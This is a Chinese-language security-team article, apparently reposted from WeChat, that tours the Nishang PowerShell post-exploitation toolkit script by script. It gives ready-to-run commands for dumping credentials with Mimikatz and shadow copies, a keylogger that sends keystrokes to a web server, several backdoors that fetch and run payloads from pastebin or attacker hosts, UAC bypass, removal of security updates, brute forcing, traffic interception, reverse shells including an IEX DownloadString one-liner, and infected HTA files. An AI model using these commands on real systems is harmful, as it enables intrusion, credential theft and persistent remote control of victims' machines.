<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Xm1vfh7d7-f0bgD4Paj2DA)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x01 目录介绍
=========

**目录结构**

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXdnNmpLncFyPk0tDUEe3ibjrV0ZAxKf3DDF0MsUxQTlBhOrKylsc4ZjWicC4WibuZp1ps4h2D0dFq0A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXdnNmpLncFyPk0tDUEe3ibjiaRqK10zwFbSBtL8RLymhZ2rA15lxUy7UTIrUHSVvZVx2T2R1RFMYXQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x02 信息收集脚本
===========

Che**ck-V**M
------------

从这个脚本的名字就可以看出来，它是用于检测当前的机器是否是一台已知的虚拟机。它通过检测已知的一些虚拟机指纹信息，比如：Hyper-V、VMWare、Virtual PC、Vietual Box、Xen、QEMU来识别。如下图，这是一台Hyper-v的虚拟机。  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXdnNmpLncFyPk0tDUEe3ibjtNVCxsTibNzs0qvhClQEyHiaKVlicuMsYaJJLRVRm0hKOHiajykjE78Uvw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

Copy-VSS
--------

这个脚本利用Volume Shadow Copy（卷影拷贝）服务来复制出SAM文件。如果这个脚本运行在了DC机上，ntds.dit和STSTEM hive也能被拷贝出来。  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXdnNmpLncFyPk0tDUEe3ibjOjxaH6cXviajLzeUgHPGTlvCGmJ355z279EUhzF9SE6HIQib9xHQXZFg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

Invoke-CredentialsPhish
-----------------------

这个脚本用于欺骗用户输入账号密码信息。执行后会出现以下弹框。直到用户输入正确后这个框才会消失，攻击者就可以得到明文的管理员账号密码。  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXdnNmpLncFyPk0tDUEe3ibjAg0FKIcCRM7jicOb2FkcmECiaEeY4Prsp1YHn4AGLYllrVfyV0FqaXJg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

FireBuster FireListener
-----------------------

FireBuster可以对内网进行扫描，它会把包发给FireListener.

该脚本的作者在Github上还提供了一个Python版的监听端：

```
https://github.com/roo7break/PowerShell-Scripts/blob/master/FireBuster/
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

Get-Information
---------------

这个脚本可以获取目标机器上大量的信息，包括：FTP访问、进程信息、计算机配置信息、无线网络和设备的信息、Host信息等非常丰富的内容。  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

也可以使用Out-File将运行结果保存至文件中。  

  

```
Get-Information | Out-File information.txt
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

Get-LSASecret
-------------

该脚本可以获取LSA信息，但是是在攻击者已经提权的情况下使用，通常与后面将要提到的Enable- DuplicateToken（帮助获取System权限）联合使用。  

  

```
`Enable-DuplicateToken``Get-LsaSecret``Get-LsaSecret -RegistryKey KeyName    # 还可以指定键名`
```

  

Get-PassHashes
--------------

此脚本在Administrator的权限下，可以dump出密码的哈希值。这个脚本来自于MSF中的powerdump，但是做出了修改，能在不用System权限的情况下就可以dump，获取hash。  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

Get-PassHints
-------------

此脚本可以从Windows获取用户的密码提示信息，但是需要有Administrator的权限读取SAM hive。  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Get-WLAN-Keys
-------------

在Administrator权限下，可以利用这个脚本dump出纯文本的WLAN密钥。实质上，这个脚本就是利用了netsh wlan shou profile kry=clear来获取密钥信息。

  

Keylogger
---------

此脚本为键盘记录脚本，可以保存下用户的键盘记录。

Nishang的键盘记录功能非常强大，首先查看这个模块的帮助文档，输入

```
Get-Help .\Gather\Keylogger.ps1 -full
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

给出了四种执行方式，具体命令如下。

```
`.Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis` `# -CheckURL参数会去检查所给出的网页之中是否包含“-MagicString”后的字符串，如果存在的话就停止使用记录。``.Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php` `# 将记录指定发送给一个可以记录Post请求的Web服务器``.Keylogger.ps1 -persist` `# 实现持久化记录（重启后依然进行记录）``.Keylogger.ps1` `# 直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下的key文件中`
```

先执行 **./Gather/Keylogger.ps1**，发现在当前用户的Temp目录下生成了Key.log文件。  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

再使用Nishang Utility中的Parse_Keys来解析，parsed.txt中是解析后的键盘记录。

```
Parse_Keys C:\Users\qingdai\AppData\Local\Temp\key.log .parsed.txt
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

Invoke-MimikatzWdigestDowngrade
-------------------------------

此脚本用于dump出windows 8.1和windows server 2012系统的用户名密码。

```
Invoke-MimikatzWDigestDowngrade     # 执行后会导致被攻击者系统锁屏
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Invoke-Mimikatz
---------------

此脚本用于在内存中加载Mimikatz。

```
`Invoke-Mimikatz -DumpCerts` `# Dump出本机的凭证信息``Invoke-Mimikatz  -DumpCerts   -ComputerName @（"computer1"，"computer2"）` `# Dump 出远程的两台计算机的凭证信息``Invoke-Mimikatz  -Command "privillage::debug exit" -ComputerName "computer1"` `# 在远程的一台机器上运行Mimikatz并执行 "privillage::debug exit"`
```

Show-TargetScreen
-----------------

使用MJPEG传输目标机器的远程桌面的实时画面，在本机我们可以使用NC或者powercat进行监听。在本地使用支持MJPEG的浏览器（火狐）访问本机对应监听端口，即可在浏览器上面看到远端传输回来的实时画面。

**被攻击端执行****：**

```
Show-TargetScreen -IPAddres 攻击端IP地址 -Port 攻击端监听端口1 -Reverse
```

**攻击端执行：**

```
`nc -l 监听端口1 | nc -l 监听端口2` `# 这里我使用的NC，也可以用Powercat`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**目录结构**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x03 域相关脚本
==========

Antak Webshell
--------------

一个aspx的Webshell，通过这个webshell可以编码、执行脚本、上传、下载文件。

**执行方式：**

上传Webshell后，把它当成一个正常的powershell执行窗口来使用；

上传和下载文件，只需要填写好对应路径点击上传、下载按钮即可。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
=============================================================================================================================

0x04 后门脚本
=========

HTTP-Backdoor
-------------

此脚本可以接收来自第三方网站的指令，并且能够下载、执行PowerShell脚本。

```
`./Backdoors/HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis``CheckURL：给出一个URL地址，如果存在MagicString中的值，就执行payload，下载运行脚本；``PayloadURL：给出需要下载的powershell脚本的地址；``Arguments：指定需要执行的函数；``StopString：会去查看是否存在CheckURL返回的字符串，如果存在就会停止执行。`
```

DNS_TXT_Pwnage  

-----------------

通常会利用DNS隧道进行信息传输、通信。Nishang中通过使用DNS_TXT_Pwnage脚本接收命令、进行通信，并在目标机器上执行。利用DNS_TXT_Pwnage脚本，需要配合Utility下的**Out-DnsTxt**使用。

```
Out-DnsTxt -DataToEncode path      # path：想编码的内容的路径
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

再接着去添加对应的TXT记录即可，encoded.txt文件中，每一行为一条记录。

添加完后还需要添加两条TXT记录，内容为start和stop。完成之后就可以利用DNS_TXT_Pwnage脚本接收命令

```
`DNS_TXT_Pwnage -startdomain start.test.com -cmdstring start -commanddomain command.test.com -psstring test -psdomain xxx.test.com -Subdomains 1 -StopString stop``# startdomain：会一直去检测指定域名的TXT记录，并把返回的记录与输入的cmdstring以及psstring进行比较；``# cmdstring：任意输入的字符串。如果startdomain与这里输入的cmdstring的值相等，则执行commandomain命令；``# commanddomain：创建的执行命令TXT记录的域名；``# psstring：任意输入的字符串，如果与这里输入的psstring值相等，则执行psdomain脚本；``# Subdomains：是执行脚本创建TXT记录的个数；``# StopString：是任意输入的字符串，吐过这里输入的字符串与stratdomain中返回的记录相同，将会停止执行Payload；``# Arguments：指定要执行的函数名。`
```

  

Execute-OnTime
--------------

此脚本可以在目标机器上指定时间执行PowerShell脚本。

```
`Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload``# PayloadURL：指定脚本下载的地址；``# 指定执行的函数名；``# Time参数可以设定脚本执行的时间（-Time 14:34）``# CheckURL：参数会检测指定的URL内容是否存在StopString给出的字符串，如果发现了就停止执行。`
```

  

Gupt-Backdoor
-------------

此脚本可以帮助攻击者通过无线电SSID反弹后门和执行命令，也就是说可以从WLAN SSID中接收命令和脚本，而不用去连接它。

```
Gupt-Backdoor -MagicString test -Verbose
```

MagicString开头的4个字符是用来识别建立的WI-FI SSID的。例如，以上使用方式中的test，Gupt后门会去自动匹配WI-FI中SSID以test开头的。而MagicString这个参数从第五个字符开始机决定了是执行命令还是下载脚本。  

  

如果第五个字符是c就代表执行命令。比如：-MagicString testcwhoami，就会匹配WI-FI SSID为test内容，并执行命令“”whoami。

  

如果第五个字符是u的话就代表下载脚本。比如，-MagicString testuXXXX，就会匹配WI-FI SSID为test的，并默认下载XXXX。其中XXXX可以在脚本的$PayloadURL参数中修改。

  

也可以用Arguments参数来指定下载脚本。例如以下命令，就可以下载Get-Information脚本。

```
Gupt-Backdoor -MagicString test -Argument Get-Information -Verbose
```

Windows系统下创建WI-FI：  

```
`cmd``netsh wlan set hostednetwork mode=allow``netsh wlan set hostednetwork ssid=test key=1234567890``netsh wlan start hostednetwork`
```

Add-ScrnSaveBackdoor
--------------------

此脚本可以帮助我们利用Windows的屏保留隐藏后门。

```
`Add-ScrnSaveBackdoor -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"` `# 使用这条语句可以执行我们自己的Payload``Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis``# 利用这条命令可以从powershell执行一个HTTP-Backdoor``Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/code_exec.ps1` `# 还可以使用msfvenom先生成一个powershell (./msfvenom -p windows/x64/meterpreter/rverse_https LHOST=192.168.254.226 -f powershell)，然后利用这条命令返回一个meterpreter`
```

PayloadURL：指定需要下载的脚本地址；

Arguments：指定需要执行的函数以及相关参数；

  

Invoke-ADSBackdoor
------------------

此脚本是使用NTFS数据流留下一个永久性后门。NTFS数据流一些安全问题的利用并不少见，可以参考《NTFS ADS带来的WEB安全问题》。

此脚本可以向ADS中注入代码并且以普通用户权限运行。

```
`Invoke-ADSBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor "http://pastebin.``com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis`
```

参数与其他后门中相同参数含义类似。但是此脚本执行后会在当前用户的AppData目录下建立一个ADS并且会将Payload注入进去，如果希望在CMD中看到建立的ADS，需要使用“dir /a /r”。  

0x04 权限提升脚本
===========

此脚本可以获取一定权限的情况下提升至System权限。

```
Enable-DuplicateToken
```

  

```
相关查阅：https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/
```

  

  

Remove-Update
-------------

此脚本可以移除系统中所有的更新或所有安全更新，以及指定编号的更新。

```
`Remove-Update All          # 移除目标系统上的所有更新``Remove-Update Security     # 移除目标系统上所有安全相关更新``Remove-Update KB2761226    # 移除指定编号的更新`
```

Invoke-PsUACme  

-----------------

此脚本使用了来自于UACME项目的DLL去Bypass UAC。下表给出了各种UAC绕过的方法，我们可以在Invoke-PsUACme中指定相应方法执行。  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`Invoke-PsUACme -Verbose` `# 使用Sysprep方法和默认的Payload执行``Invoke-PsUACme -method oobe -Verbose` `# 使用oobe方法和默认的Payload执行``Invoke-PsUACme -method oobe -Payload "powershell -windowstyle hidden -e YourEncodedPayload"` `# 使用-Payload参数可以自行指定要执行的Payload`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

除上述所示，还可以使用-PayloadPath参数来指定Payload的路径，默认情况下Payload会在C:WindowsTempcmd.bat结束。还可以使用-CustomDLL64（64位）或-CustomDLL32（32位）参数来自定义一个DLL文件。  

  

0x05 扫描脚本
=========

DInvoke-BruteForce
------------------

这个脚本可以对SQL Server、域控制器、Web以及FTP进行口令的爆破

```
`Invoke-BruteForce -ComputerName targetdomain.com -UserList C:testusers.txt -PasswordList C:testwordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose` `# 爆破域控制器``Invoke-BruteForce -ComputerName SQLServ01 -UserList C:testusers.txt -PasswordList C:testwordlist.txt -Service SQL -Verbose` `# 爆破SQL Server``cat C:testservers.txt | Invoke-BruteForce -UserList C:testusers.txt -PasswordList C:testwordlist.txt -Service SQL -Verbose` `# 爆破server.txt中所有servers的SQL Server``参数：``ComputerName：用于指定对应服务的计算机名；``UserList：用户名字典；``PasswordList：密码字典；``Service：服务类型（默认为SQL）；``StopOnSuccess：成功找到一个后就停止执行；``Delay：延迟时间`
```

Invoke-PortScan  

------------------

此脚本可以在目标机器上对内网进行端口扫描 。

```
`Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80``参数：``StartAddress：扫描范围开始的地址；``EndAddress：扫描范围结束的地址；``ResolveHost：解析主机名``ScanPort：进行端口扫描；``Port：指定扫描端口，默认扫描以下端口:21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901）；``TimeOut：设置超时时间；`
```

0x06 中间人脚本  

=============

Invoke-Interceptor
------------------

这个脚本可以通过建立一个代理服务器的方式来拦截HTTPS的请求，并将这些请求记录下来，可以通过ListenPort修改目标机器上的监听端口（默认8081端口） 。

  

攻击端接收到了来自被攻击端的请求数据，并且这个脚本会在被攻击端的TEMP目录下生成interceptor.log的文件记录请求数据。

```
`被攻击端：``Invoke-Interceptor -ProxyServer 攻击端IP -ProxyPort 攻击端侦听端口``# 默认监听8081端口，并把请求发送给攻击端的侦听端口``攻击端：``nc -l 攻击端侦听端口`
```

0x07 Shell交互式脚本  

==================

Invoke-PowerShellTcp
--------------------

Invoke-PowerShellTcp是PowerS hell交互式正向连接或反向连接shell，基于TCP协议。

1.  **正向连接**
    

```
`目标主机（反弹shell）：``Invoke-PowerShellTcp -Bind -Port xxxx``攻击端（监听）：``nc -nv 目标主机IP 端口`
```

2.  **反向连接**
    

注意必须是攻击端先开启监听，否则目标主机上执行脚本会出错。

```
`攻击端（监听）：``nc -ltp 端口``目标主机（反弹shell）：``Invoke-PowerShellTcp -Reverse -IPAddress 攻击端IP -Port 端口`
```

Invoke-PowerShellUdp  

-----------------------

Invoke-PowerShellUdp PowerShell交互式正向连接或反向连接Shell，基于UDP协议。

1.  **正向连接**
    

     UDP协议的正向连接与TCP协议用法相同，不过是基于UDP协议，所以NC命令需要做些改动。

```
`目标主机（反弹shell）：``Invoke-PowerShellUdp -Bind -port 端口``攻击端（监听）：``nc -nvu 目标主机IP 端口`
```

2.  **反向连接**
    

反向连接与TCP反向连接用法相同，不过在使用NC监听时需要使用UDP协议。

```
`目标主机（反弹shell）：``Invoke-PowerShellUdp -Reverse -IPAdress 攻击端IP -Port 端口``攻击端（监听）：``nc -lup 端口`
```

Invoke-PoshRatHttps
-------------------

Invoke-PoshRatHttps是PowerShell交互式反向连接Shell，基于HTTPS协议。

```
`攻击端（监听）：``Invoke-PoseRatHttps -IPAddress 攻击端IP -Port 监听端口``# 需要在攻击端上执行脚本``目标主机（反弹shell）：``IEX ((New-Object Net.WebClient).DownloadString('http://攻击端IP:监听端口/connect'))``# 目标主机运行以上命令，反弹shell`
```

Invoke-PoshRatHttp  

---------------------

Invoke-PoshRatHttp是PowerShell交互式反向连接Shell，基于HTTP协议。用法与Invoke-PoshRatHttps类似。

```
`攻击端（监听）：``Invoke-PoseRatHttp -IPAddress 攻击端IP -Port 监听端口``# 需要在攻击端上执行脚本``目标主机（反弹shell）：``IEX ((New-Object Net.WebClient).DownloadString('http://攻击端IP:监听端口/connect'))``# 目标主机运行以上命令，反弹shell`
```

0x08 RCE脚本  

=============

Download_Execute
----------------

Download_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能是下载文本文件再将其转换为可执行文件执行。

```
`ExetoText c:\powershellmsf.exe c:\powershellmsf.txt Converted file written to c:\powershellmsf.txt``# 使用Nishang中的exetotext.ps1脚本将可执行文件改为文本文件。``Download_Execute http://IP_address/msf.txt``# 使用Download_Execute下载执行文本文件`
```

再观察Metasploit就可发现成功获得shell。  

0x09 Client脚本
=============

Nishang中还有生成各种危害文件的脚本，它们可以生成各种感叹的文件，如HTA、Word等，去执行powershell脚本，可以静默的发动攻击，各个脚本的用法也大致相同。

  

Out-HTA
-------

创建受感染的HTA文件，可以执行PowerShell命令和脚本。

```
`目标主机：``Out-HTA -PayloadScript c:\nishang\shells\Invoke-PowerShellTcpOneLine.ps1 -HTAFilePath C:\hacker.HTA``# 创建一个受感染的HTA文件（创建HTA木马时，payload设置的反弹地址与端口与攻击端保持一致）``攻击端：``nc -l 端口``# NC监听端口，运行受感染的HTA文件。`
```

参考：  

```
`https://www.cnblogs.com/-qing-/p/10742487.html``https://blog.csdn.net/weixin_40412037/article/details/115510209?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164690292016780271593960%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=164690292016780271593960&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-115510209.nonecase&utm_term=nishang&spm=1018.2226.3001.4450` `https://www.cnblogs.com/-qing-/p/10742487.html``https://blog.csdn.net/m0_37438418/article/details/80371414`
```

E

N

D

  

  

**关**

**于**

**我**

**们**

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web安全、移动终端、安全开发、物联网/工控安全/AI安全等多个领域。

团队作为“省级等保关键技术实验室”先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室。团队公众号自创建以来，共发布原创文章370余篇，自研平台达到26个，目有15个平台已开源。此外积极参加各类线上、线下CTF比赛并取得了优异的成绩。如有对安全行业感兴趣的小伙伴可以踊跃加入或关注我们。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)